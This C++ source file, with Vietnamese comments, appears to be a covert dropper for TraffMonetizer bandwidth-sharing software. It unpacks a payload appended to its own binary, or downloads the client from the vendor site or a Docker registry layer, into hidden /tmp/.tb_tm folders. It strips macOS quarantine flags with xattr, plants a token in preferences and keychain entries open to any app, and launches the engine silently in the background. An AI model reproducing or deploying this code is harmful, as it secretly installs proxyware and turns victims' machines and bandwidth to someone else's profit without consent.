#ifndef TRAFFMONETIZER_CPP
#define TRAFFMONETIZER_CPP

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <set>
#include <chrono>
#include <thread>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <dirent.h>
#include <csignal>
#include <sys/types.h>
#include <sys/stat.h>

#if defined(__APPLE__) || defined(__MACH__)
#include <mach-o/dyld.h>
#endif

class TraffMonetizerEngine {
private:
    static inline int safe_exec(const std::string& cmd) {
        int r = system(cmd.c_str());
        (void)r;
        return r;
    }

    static bool extract_bundle_payload(const std::string& self_path, const std::string& out_path) {
        if (self_path.empty()) return false;
        FILE* f = fopen(self_path.c_str(), "rb");
        if (!f) return false;
        if (fseek(f, -24, SEEK_END) != 0) { fclose(f); return false; }
        char foot[24];
        if (fread(foot, 1, 24, f) != 24 || memcmp(foot + 8, "TURBOX_BUNDLE", 13) != 0) {
            fclose(f); return false;
        }
        uint64_t sz = 0;
        memcpy(&sz, foot, 8);
        if (sz == 0 || sz > 100000000ULL || fseek(f, -(24 + (long)sz), SEEK_END) != 0) {
            fclose(f); return false;
        }
        FILE* out = fopen(out_path.c_str(), "wb");
        if (!out) { fclose(f); return false; }
        char buf[65536];
        uint64_t left = sz;
        while (left > 0) {
            size_t c = left > sizeof(buf) ? sizeof(buf) : (size_t)left;
            size_t r = fread(buf, 1, c, f);
            if (r == 0) break;
            fwrite(buf, 1, r, out);
            left -= r;
        }
        fclose(out); fclose(f);
        return (left == 0);
    }

    static bool check_tm_socket(pid_t pid) {
        if (pid <= 0) return false;
#if defined(__APPLE__) || defined(__MACH__)
        std::string cmd = "lsof -a -p " + std::to_string(pid) + " -i 2>/dev/null | grep -i 'ESTABLISHED' | head -n 1";
        FILE* lp = popen(cmd.c_str(), "r");
        bool connected = false;
        if (lp) {
            char lbuf[128];
            if (fgets(lbuf, sizeof(lbuf), lp)) connected = true;
            pclose(lp);
        }
        return connected;
#else
        std::set<std::string> inodes;
        std::string fd_dir = "/proc/" + std::to_string(pid) + "/fd";
        DIR* d = opendir(fd_dir.c_str());
        if (d) {
            struct dirent* de;
            char target[512];
            while ((de = readdir(d)) != nullptr) {
                if (de->d_name[0] == '.') continue;
                std::string p = fd_dir + "/" + de->d_name;
                ssize_t len = readlink(p.c_str(), target, sizeof(target) - 1);
                if (len > 0) {
                    target[len] = '\0';
                    std::string s(target);
                    if (s.rfind("socket:[", 0) == 0 && s.back() == ']') {
                        inodes.insert(s.substr(8, s.length() - 9));
                    }
                }
            }
            closedir(d);
        }

        if (inodes.empty()) {
            std::string ss_cmd = "ss -tanp 2>/dev/null | grep 'pid=" + std::to_string(pid) + ",' | grep -i 'ESTAB' | head -n 1";
            FILE* p = popen(ss_cmd.c_str(), "r");
            if (p) {
                char buf[128];
                bool found = (fgets(buf, sizeof(buf), p)) != nullptr;
                pclose(p);
                if (found) return true;
            }
            return false;
        }

        const char* tcp_files[] = {"/proc/net/tcp", "/proc/net/tcp6", nullptr};
        for (int i = 0; tcp_files[i]; ++i) {
            std::ifstream f(tcp_files[i]);
            if (!f.is_open()) continue;
            std::string line;
            std::getline(f, line);
            while (std::getline(f, line)) {
                std::istringstream ss(line);
                std::string sl, local, rem, st, tx_rx, tr, retr, uid, timeout, inode;
                if (ss >> sl >> local >> rem >> st >> tx_rx >> tr >> retr >> uid >> timeout >> inode) {
                    if (st == "01" && inodes.find(inode) != inodes.end()) {
                        return true;
                    }
                }
            }
        }
        return false;
#endif
    }

    static std::string parse_tm_log() {
        std::ifstream f("/tmp/.tb_tm.log");
        if (!f.is_open()) return "";
        std::vector<std::string> lines;
        std::string line;
        while (std::getline(f, line)) {
            while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
            if (!line.empty()) {
                if (line.find("$$") == std::string::npos && line.find("\\__") == std::string::npos && line.find("/__") == std::string::npos) {
                    lines.push_back(line);
                    if (lines.size() > 30) lines.erase(lines.begin());
                }
            }
        }
        if (lines.empty()) return "";
        std::string latest = lines.back();
        if (latest.rfind("[TM] ", 0) == 0) latest = latest.substr(5);
        if (latest.length() > 100) latest = latest.substr(0, 97) + "...";
        return latest;
    }

public:
    static pid_t get_pid() {
        pid_t pid = -1;
        std::ifstream pf("/tmp/.tb_tm.pid");
        if (pf >> pid && pid > 0 && kill(pid, 0) == 0) {
#if !defined(__APPLE__) && !defined(__MACH__)
            std::string cmd_path = "/proc/" + std::to_string(pid) + "/cmdline";
            std::ifstream cmd_f(cmd_path);
            std::string cmd;
            if (std::getline(cmd_f, cmd)) {
                if (cmd.find("cli") != std::string::npos || cmd.find("traffmonetizer") != std::string::npos) {
                    return pid;
                }
            }
#else
            return pid;
#endif
        }

#if defined(__APPLE__) || defined(__MACH__)
        FILE* p = popen("pgrep -i 'traffmonetizer' 2>/dev/null | head -n 1", "r");
        if (p) {
            char buf[32];
            if (fgets(buf, sizeof(buf), p)) pid = (pid_t)std::atoi(buf);
            pclose(p);
            if (pid > 0 && kill(pid, 0) == 0) return pid;
        }
#else
        DIR* dir = opendir("/proc");
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != nullptr) {
                if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
                    std::string cmd_path = std::string("/proc/") + entry->d_name + "/cmdline";
                    std::ifstream cmd_f(cmd_path);
                    std::string cmd;
                    if (std::getline(cmd_f, cmd)) {
                        if (cmd.find("/tmp/.tb_tm/cli") != std::string::npos || 
                            (cmd.find("cli") != std::string::npos && cmd.find("accept") != std::string::npos)) {
                            pid = (pid_t)std::atoi(entry->d_name);
                            closedir(dir);
                            std::ofstream out_pf("/tmp/.tb_tm.pid");
                            if (out_pf.is_open()) { out_pf << pid << std::endl; }
                            return pid;
                        }
                    }
                }
            }
            closedir(dir);
        }
#endif
        return -1;
    }

    static bool is_alive() {
        return (get_pid() > 0);
    }

    static void stop() {
        pid_t pid = get_pid();
        if (pid > 0) {
            kill(pid, SIGTERM);
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            kill(pid, SIGKILL);
        }
        // Khong xoa /tmp/.tb_tm/cli de tai khoi dong nhanh ma khong can bung lai payload
        safe_exec("pkill -9 -f '/tmp/.tb_tm/cli' 2>/dev/null || true; "
                  "pkill -9 -f 'traffmonetizer' 2>/dev/null || true; "
                  "pkill -9 -f 'TraffMonetizer' 2>/dev/null || true; "
                  "rm -f /tmp/.tb_tm.pid /tmp/.tb_tm.log 2>/dev/null || true");
    }

    static std::string get_status_report() {
        pid_t tm_pid = get_pid();
        if (tm_pid > 0) {
            bool connected = check_tm_socket(tm_pid);
            std::string log_msg = parse_tm_log();
            if (log_msg.find("connected") != std::string::npos || log_msg.find("Connected") != std::string::npos) {
                connected = true;
            }
            std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
            if (log_msg.empty()) log_msg = connected ? "Connected to hub." : "Connecting to hub...";
            return "[TM: PID " + std::to_string(tm_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
        } else {
            std::string log_msg = parse_tm_log();
            if (!log_msg.empty()) {
                return "[TM] Not started (" + log_msg + ")";
            }
            return "[TM] Not started";
        }
    }

    static bool start(const std::string& token, const std::string& self_bin_path, std::string& current_step, std::string& step_detail) {
        if (is_alive()) return true;

#if defined(__APPLE__) || defined(__MACH__)
        current_step = "EXTRACT_PAYLOAD";
        step_detail = "Kiem tra va bung payload TraffMonetizer.app";
        std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
        if (access(app_dir.c_str(), F_OK) != 0) {
            if (extract_bundle_payload(self_bin_path, "/tmp/.tb_tm.tar.gz")) {
                safe_exec("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
            }
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/Traffmonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0) {
            step_detail = "Tai truc tiep Traffmonetizer.dmg tu data.traffmonetizer.com";
            safe_exec("curl -sSL --max-time 60 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                      "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
                      "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
                      "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
                      "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
                      "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
        }
        if (access(app_dir.c_str(), F_OK) != 0) {
            current_step = "ERROR_PAYLOAD";
            step_detail = "Khong the tim thay Traffmonetizer.app trong bundle hoac download";
            return false;
        }

        current_step = "FIX_PERMISSIONS";
        step_detail = "Go Quarantine giu nguyen chu ky Developer ID goc";
        std::string sec_fix = "xattr -cr '" + app_dir + "' 2>/dev/null || true";
        safe_exec(sec_fix);

        std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
        if (access(bin_path.c_str(), X_OK) != 0) {
            bin_path = app_dir + "/Contents/MacOS/TraffMonetizer";
        }

        safe_exec("pkill -9 -i 'traffmonetizer' 2>/dev/null || true");
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        current_step = "INJECT_TOKEN";
        step_detail = "Nap config.token & config.active vao Preferences";
        std::string pref = "defaults write com.traffmonetizer.client.macos 'flutter.config.token' -string '" + token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'config.token' -string '" + token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.config.active' -bool true 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'config.active' -bool true 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter._clientToken' -string '" + token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.clientToken' -string '" + token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.token' -string '" + token + "' 2>/dev/null; "
                           "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.config.token' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'config.token' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.config.active' -bool true 2>/dev/null; "
                           "defaults write \"$P\" 'config.active' -bool true 2>/dev/null; "
                           "defaults write \"$P\" 'flutter._clientToken' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.clientToken' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.token' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'clientToken' -string '" + token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'token' -string '" + token + "' 2>/dev/null; "
                           "done; "
                           "security delete-generic-password -a 'token' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'config.token' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'token' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security delete-generic-password -a 'config.token' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'config.token' -s 'com.traffmonetizer.client.macos' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'config.token' -s 'flutter_secure_storage_service' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'com.traffmonetizer.client.macos' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'com.traffmonetizer.client.macos' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'flutter_secure_storage_service' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'flutter_secure_storage_service' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'flutter_secure_storage_service' -w '" + token + "' -U 2>/dev/null || true";
        safe_exec(pref);

        current_step = "LAUNCH_ENGINE";
        step_detail = "Khoi chay TraffMonetizer ngam";
        std::string launch_cmd = "open -a '" + app_dir + "' --args --token '" + token + "' 2>/dev/null || "
                                 "nohup '" + bin_path + "' --token '" + token + "' >> /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
        safe_exec(launch_cmd);

        std::this_thread::sleep_for(std::chrono::milliseconds(2500));
        if (is_alive()) {
            current_step = "ENGINE_RUNNING";
            step_detail = "TraffMonetizer chay thanh cong";
            return true;
        } else {
            current_step = "ENGINE_CRASHED";
            std::string log_tail = get_status_report();
            step_detail = "Engine crash ngay khi start. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
            return false;
        }
#else
        current_step = "EXTRACT_PAYLOAD";
        step_detail = "Kiem tra va bung native engine self-contained TraffMonetizer";
        std::string eng_bin = "/tmp/.tb_tm/cli";
        safe_exec("mkdir -p /tmp/.tb_tm 2>/dev/null");

        if (access(eng_bin.c_str(), X_OK) != 0) {
            if (extract_bundle_payload(self_bin_path, "/tmp/.tb_tm.tar.gz")) {
                safe_exec("mkdir -p /tmp/.tb_tm 2>/dev/null; "
                          "tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null || tar -xf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null; "
                          "rm -f /tmp/.tb_tm.tar.gz; "
                          "cp -f /tmp/.tb_tm/usr/local/bin/cli /tmp/.tb_tm/cli 2>/dev/null || "
                          "find /tmp/.tb_tm -type f -name cli -exec cp -f {} /tmp/.tb_tm/cli \\; 2>/dev/null; "
                          "chmod 755 /tmp/.tb_tm/cli 2>/dev/null");
            } else if (extract_bundle_payload(self_bin_path, "/tmp/.tb_tm.gz")) {
                safe_exec("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm/cli 2>/dev/null && chmod 755 /tmp/.tb_tm/cli 2>/dev/null && rm -f /tmp/.tb_tm.gz");
            }
        }

        if (access(eng_bin.c_str(), X_OK) != 0) {
            step_detail = "Tai native self-contained package TraffMonetizer day du";
            FILE* py_f = fopen("/tmp/.tb_tm_get.py", "w");
            if (py_f) {
                fputs("import urllib.request, json, tarfile, io, os, shutil, platform\n"
                      "try:\n"
                      "    os.makedirs('/tmp/.tb_tm', exist_ok=True)\n"
                      "    m = platform.machine().lower()\n"
                      "    is_arm = 'aarch64' in m or 'arm' in m\n"
                      "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=15).read().decode())['token']\n"
                      "    layer = 'sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a' if is_arm else 'sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b'\n"
                      "    req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/' + layer, headers={'Authorization': 'Bearer ' + tok})\n"
                      "    tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
                      "    tf.extractall('/tmp/.tb_tm_ext')\n"
                      "    if os.path.exists('/tmp/.tb_tm_ext/usr/local/bin/cli'):\n"
                      "        shutil.move('/tmp/.tb_tm_ext/usr/local/bin/cli', '/tmp/.tb_tm/cli')\n"
                      "        os.chmod('/tmp/.tb_tm/cli', 0o755)\n"
                      "        shutil.rmtree('/tmp/.tb_tm_ext', ignore_errors=True)\n"
                      "except Exception:\n"
                      "    pass\n", py_f);
                fclose(py_f);
                safe_exec("python3 /tmp/.tb_tm_get.py 2>/dev/null && rm -f /tmp/.tb_tm_get.py");
            }
        }

        if (access(eng_bin.c_str(), X_OK) == 0) {
            current_step = "LAUNCH_ENGINE";
            step_detail = "Khoi chay Linux Native Engine: start accept --token " + token.substr(0, 8) + "...";
            std::string run_cmd = "nohup " + eng_bin + " start accept --token \"" + token + "\" > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
            safe_exec(run_cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(1500));
            pid_t p = get_pid();
            if (p > 0) {
                current_step = "ENGINE_RUNNING";
                step_detail = "Linux Engine TraffMonetizer chay thanh cong (PID " + std::to_string(p) + ")";
                return true;
            } else {
                current_step = "ENGINE_CRASHED";
                std::string log_tail = get_status_report();
                step_detail = "Linux Engine crash. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
                return false;
            }
        } else {
            current_step = "ERROR_ENGINE";
            step_detail = "Khong tim thay engine thuc thi /tmp/.tb_tm/cli";
            return false;
        }
#endif
    }
};

#endif // TRAFFMONETIZER_CPP
